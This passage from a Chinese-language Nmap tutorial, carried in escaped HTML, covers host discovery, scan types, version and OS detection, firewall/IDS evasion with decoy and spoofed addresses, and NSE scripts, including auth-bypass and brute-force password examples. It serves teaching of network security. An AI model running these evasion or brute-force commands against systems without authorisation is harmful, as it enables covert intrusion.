–sn&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;Nmap会发送四种不同类型的数据包来探测目标主机是否在线。&lt;/p&gt;\n&lt;p&gt; &lt;/p&gt;\n&lt;p&gt;ICMP echo request&lt;/p&gt;\n&lt;p&gt;a TCP SYN packet to port 443(https)&lt;/p&gt;\n&lt;p&gt;a TCP ACK packet to port 80(http)&lt;/p&gt;\n&lt;p&gt;an ICMP timestamp request&lt;/p&gt;\n&lt;p&gt;依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;nmap -PE/-PP/-PM&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;-PE 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。&lt;/p&gt;\n&lt;p&gt;-PP 的ICMP time stamp时间戳扫描在大多数防火墙配置不当时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务&lt;/p&gt;\n&lt;p&gt;-PM 的ICMP address maskPing&lt;a href=\&quot;#\&quot; title=\&quot;#_msocom_6\&quot;&gt;[S6]&lt;/a&gt; 地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的穿透防火墙的效果&lt;/p&gt;\n&lt;h5 id=\&quot;当探测内网ip时\&quot;&gt;当探测内网IP时&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#当探测内网ip时\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;&lt;strong&gt;nmap -sn&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;使用 nmap  -sn  内网ip   这个命令会发送arp请求包探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;nmap -PE/-PP/-PM&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;使用nmap -PE/PP/PM  内网ip 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务&lt;/p&gt;\n&lt;h3 id=\&quot;722-端口扫描及原理\&quot;&gt;7.2.2 端口扫描及原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#722-端口扫描及原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;原理\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。&lt;/p&gt;\n&lt;p&gt;默认情况下，Nmap会扫描1000个最有可能开放的TCP端口&lt;/p&gt;\n&lt;p&gt;Nmap通过探测将端口划分为6个状态：&lt;/p&gt;\n&lt;p&gt;open：端口是开放的。&lt;/p&gt;\n&lt;p&gt;closed：端口是关闭的。&lt;/p&gt;\n&lt;p&gt;filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。&lt;/p&gt;\n&lt;p&gt;unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。&lt;/p&gt;\n&lt;p&gt;open|filtered：端口是开放的或被屏蔽，Nmap不能识别。&lt;/p&gt;\n&lt;p&gt;closed|filtered ：端口是关闭的或被屏蔽，Nmap不能识别&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP SYN&lt;/strong&gt; &lt;strong&gt;扫描(-sS)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP connent&lt;/strong&gt; &lt;strong&gt;扫描(-sT)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标主机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP ACK&lt;/strong&gt; &lt;strong&gt;扫描(-sA)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。&lt;strong&gt;该方式只能用于确定防火墙是否屏蔽某个端口&lt;/strong&gt;，可以辅助TCP SYN的方式来判断目标主机防火墙的状况&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP FIN/Xmas/NULL&lt;/strong&gt; &lt;strong&gt;扫描(-sN/sF/sX)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN 包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;UDP****扫描(-sU)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;UDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;其他方式(-sY/-sZ)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的&lt;/p&gt;\n&lt;h5 id=\&quot;简单扫描nmap-ip\&quot;&gt;简单扫描（nmap ip）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#简单扫描nmap-ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;例如： nmap 202.207.236.2这个命令会按照 nmap-services 文件中指定的端口进行扫描，然后列出目标主机开放的端口号，以及端口号上运行的服务。在一次简单扫描中，Nmap会以默认TCP SYN扫描方式进行，仅判断目标端口是否开放，若开放，则列出端口对应的服务名称。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;探测端口开放过程&lt;/strong&gt;：确定主机在线之后，nmap会按照nmap-services文件中的端口号发送TCP SYN报文给主机相应的端口，如果主机回复一个包含TCP SYN、ACK的报文，则说明该端口号开放。nmap会再回复一个TCP RST清除连接复位。下面的截图是nmap是和目标主机的80号端口的探测过程，由此可见，目标主机的22号端口属于开放状态\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/16.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h5 id=\&quot;全面扫描nmap--a-ip\&quot;&gt;全面扫描(nmap -A ip)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#全面扫描nmap--a-ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;进攻式扫描（慎用）&lt;/p&gt;\n&lt;p&gt;例如：nmap -A 202.207.236.2 这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/15.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n全面扫描时数据流量包的截图，确定了哪些端口的协议开启了之后，进行更加深入的探测！\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/17.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h5 id=\&quot;探测指定端口的开放状态\&quot;&gt;探测指定端口的开放状态&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#探测指定端口的开放状态\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 80-445 10.96.10.246 扫描目标主机的80-445端口的开放情况&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sS -sU --top-ports 100 10.96.10.246 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；—top-ports 100表示扫描最有可能开放的100个端口（TCP和UDP分别100个端口）。&lt;/p&gt;\n&lt;h3 id=\&quot;723-版本侦测\&quot;&gt;7.2.3 版本侦测&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#723-版本侦测\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。&lt;/p&gt;\n&lt;p&gt;Nmap提供的版本侦测具有如下的优点：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。&lt;/li&gt;\n&lt;li&gt;尽可能地确定应用名字与版本名字。&lt;/li&gt;\n&lt;li&gt;支持TCP/UDP协议，支持文本格式与二进制格式。&lt;/li&gt;\n&lt;li&gt;支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。&lt;/li&gt;\n&lt;li&gt;如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。&lt;/li&gt;\n&lt;li&gt;如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。&lt;/li&gt;\n&lt;li&gt;支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。&lt;/li&gt;\n&lt;li&gt;通用平台枚举功能（CPE）&lt;/li&gt;\n&lt;li&gt;广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h5 id=\&quot;原理-1\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;本侦测主要分为以下几个步骤：&lt;/p&gt;\n&lt;p&gt;首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。&lt;/p&gt;\n&lt;p&gt;如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。&lt;/p&gt;\n&lt;p&gt;通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。&lt;/p&gt;\n&lt;p&gt;如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。&lt;/p&gt;\n&lt;p&gt;如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。&lt;/p&gt;\n&lt;p&gt;如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。&lt;/p&gt;\n&lt;p&gt;如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。&lt;/p&gt;\n&lt;h5 id=\&quot;用法\&quot;&gt;用法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#用法\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;比如目标主机把SSH的22号端口改成了2222端口，那么如果使用普通扫描只会发现2222端口是开启的，并不能知道2222号端口上运行的程序，通过加参数  -sV  进行版本扫描，可以探测到目标主机上2222端口运行的是SSH服务&lt;/p&gt;\n&lt;p&gt;-sV: 指定让Nmap进行版本侦测&lt;/p&gt;\n&lt;p&gt;—version-intensity &amp;#x3C;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。&lt;/p&gt;\n&lt;p&gt;—version-light: 指定使用轻量侦测方式 (intensity 2)&lt;/p&gt;\n&lt;p&gt;—version-all: 尝试使用所有的probes进行侦测 (intensity 9)&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;h3 id=\&quot;724-os侦测\&quot;&gt;7.2.4 OS侦测&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#724-os侦测\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;原理-2\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理-2\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。&lt;/p&gt;\n&lt;p&gt;协议栈指纹识别是一项强大的技术，能够以很高的概率迅速确定操作系统的版本。虽然TCP/IP协议栈的定义已经成为一项标准，但是各个厂家，如微软和RedHat等在编写自己的TCP/IP协议栈时，却做出了不同的解释。这些解释因具有独一无二的特性，故被称为“指纹”。通过这些细微的差别，可以准确定位操作系统的版本&lt;/p&gt;\n&lt;p&gt;具体实现方式如下：&lt;/p&gt;\n&lt;p&gt;Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。&lt;/p&gt;\n&lt;p&gt;分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。&lt;/p&gt;\n&lt;p&gt;将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。&lt;/p&gt;\n&lt;h5 id=\&quot;用法-1\&quot;&gt;用法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#用法-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;-O: 指定Nmap进行OS侦测。&lt;/p&gt;\n&lt;p&gt;—osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。&lt;/p&gt;\n&lt;p&gt;—osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n例：\n&lt;code&gt;nmap -O 10.96.10.246&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;73-nmap高级功能\&quot;&gt;7.3 nmap高级功能&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#73-nmap高级功能\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：数据包的变换(Packet Change)和时序变换(Timing Change)&lt;/p&gt;\n&lt;h3 id=\&quot;731-防火墙ids规避\&quot;&gt;7.3.1 防火墙/IDS规避&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#731-防火墙ids规避\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;分片\n将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查&lt;/li&gt;\n&lt;li&gt;IP诱骗(IP decoys)\n在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址&lt;/li&gt;\n&lt;li&gt;IP伪装\nIP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术&lt;/li&gt;\n&lt;li&gt;指定源端口\n某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口&lt;/li&gt;\n&lt;li&gt;扫描延时\n某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度&lt;/li&gt;\n&lt;li&gt;其他技术\nnmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f; --mtu &amp;#x26;lt;val&amp;#x26;gt;: 指定使用分片、指定数据包的 MTU.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D &amp;#x26;lt;decoy1,decoy2\\[,ME\\],...&amp;#x26;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-S &amp;#x26;lt;IP_Address&amp;#x26;gt;: 伪装成其他 IP 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-e &amp;#x26;lt;iface&amp;#x26;gt;: 使用特定的网络接口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g/--source-port &amp;#x26;lt;portnum&amp;#x26;gt;: 使用指定源端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--data-length &amp;#x26;lt;num&amp;#x26;gt;: 填充随机数据让数据包长度达到 Num。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--ip-options &amp;#x26;lt;options&amp;#x26;gt;: 使用指定的 IP 选项来发送数据包。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--ttl &amp;#x26;lt;val&amp;#x26;gt;: 设置 time-to-live 时间。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--spoof-mac &amp;#x26;lt;mac address/prefix/vendor name&amp;#x26;gt;: 伪装 MAC 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -F -Pn -D 10.96.10.100,10.96.10.110,ME -e eth0 -g 5555 202.207.236.3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;-F参数表示快速扫描100个端口，-Pn不进行ping扫描，-D表示使用ip诱骗方式掩饰真实ip，使用的是10.96.10.100和10.96.10.110，ME表示自己真实的ip，这里是10.96.10.234，-e 参数指定eth0网卡发送数据包，-g参数指定发送的端口号&lt;/p&gt;\n&lt;h3 id=\&quot;nse脚本引擎\&quot;&gt;NSE脚本引擎&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nse脚本引擎\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;NSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。&lt;/p&gt;\n&lt;p&gt;nmap的脚本库的路径：/usr/share/nmap/scripts或/xx/nmap/scripts/ ，该目录下的文件都是nse脚本&lt;/p&gt;\n&lt;p&gt;NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;网络发现（Network Discovery）&lt;/li&gt;\n&lt;li&gt;更加复杂的版本侦测（例如 skype 软件）&lt;/li&gt;\n&lt;li&gt;漏洞侦测(Vulnerability Detection)&lt;/li&gt;\n&lt;li&gt;后门侦测(Backdoor Detection)&lt;/li&gt;\n&lt;li&gt;漏洞利用(Vulnerability Exploitation)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h5 id=\&quot;分类扫描\&quot;&gt;分类扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#分类扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;Nmap的脚本主要分为以下几类：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;auth: 负责处理鉴权证书（绕开鉴权）的脚本&lt;/li&gt;\n&lt;li&gt;broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务&lt;/li&gt;\n&lt;li&gt;brute: 提供暴力破解方式，针对常见的应用如http/snmp等&lt;/li&gt;\n&lt;li&gt;default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力&lt;/li&gt;\n&lt;li&gt;discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等&lt;/li&gt;\n&lt;li&gt;dos: 用于进行拒绝服务攻击&lt;/li&gt;\n&lt;li&gt;exploit: 利用已知的漏洞入侵系统&lt;/li&gt;\n&lt;li&gt;external: 利用第三方的数据库或资源，例如进行whois解析&lt;/li&gt;\n&lt;li&gt;fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽&lt;/li&gt;\n&lt;li&gt;malware: 探测目标机是否感染了病毒、开启了后门等信息&lt;/li&gt;\n&lt;li&gt;safe: 此类与intrusive相反，属于安全性脚本&lt;/li&gt;\n&lt;li&gt;version: 负责增强服务与版本扫描（Version Detection）功能的脚本&lt;/li&gt;\n&lt;li&gt;vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067\n&lt;strong&gt;示例：&lt;/strong&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=auth 192.168.137.\\* 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/18.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script-brute 192.168.1.1 #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/19.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; 